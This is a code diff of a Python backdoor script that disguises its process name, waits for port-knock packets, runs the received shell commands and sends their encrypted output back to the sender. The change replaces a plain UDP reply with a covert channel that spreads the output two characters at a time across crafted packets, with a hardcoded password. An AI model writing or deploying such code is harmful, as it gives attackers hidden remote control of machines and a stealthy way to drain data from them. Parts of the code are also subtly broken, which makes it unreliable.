@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import logging, setproctitle, triplesec, encryption, configfile
+import logging, setproctitle, triplesec, encryption, configfile, packetFunctions, helpers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from ctypes import cdll, byref, create_string_buffer
@@ -10,14 +10,6 @@ ports = [1000, 2000, 3000]
 password = 'abcdefyoyo'
 # unauthClients = {}
 # authedClients = {}
-
-# def encrypt(data):
-#     cipherText = triplesec.encrypt(b"string", b'* password *')
-#     return cipherText
-
-# def decrypt(data):
-#     plainText = triplesec.decrypt(data, b'* password *').decode()
-#     return plainText
 
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
@@ -56,11 +48,24 @@ def knock(packet):
 
 def shellCommand(packet, command):
     print "Running command " + command
+    ip = packet[IP].src
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    output = password + output.stdout.read() + output.stderr.read()
+    output = configfile.password + output.stdout.read() + output.stderr.read()
     encryptedData = encryption.encrypt(output, configfile.password)
-    packet = IP(dst=packet[0][1].src)/UDP(dport=8000, sport=8000)/Raw(load=encryptedData)
-    send(packet)
+    dataToSend = helpers.chunkString(2, encryptedData)
+    lastIndex = len(dataToSend) - 1
+    for index, pair in enumerate(dataToSend):
+    	packet = ''
+    	if len(pair) == 2:
+    		char1, char2 = pair.split('')
+    		packet = packetFunctions.createPacketTwo(configfile.protocol, ip, char1, char2)
+    	else:
+    		packet = packetFunctions.createPacketOne(configfile.protocol, ip, pair)
+    	if index == lastIndex:
+    		packet = packet/Raw(load=configfile.password)
+    	send(packet)
+    	time.sleep(0.1)
+
 
 def watchAdd():
     print "watchAdd"
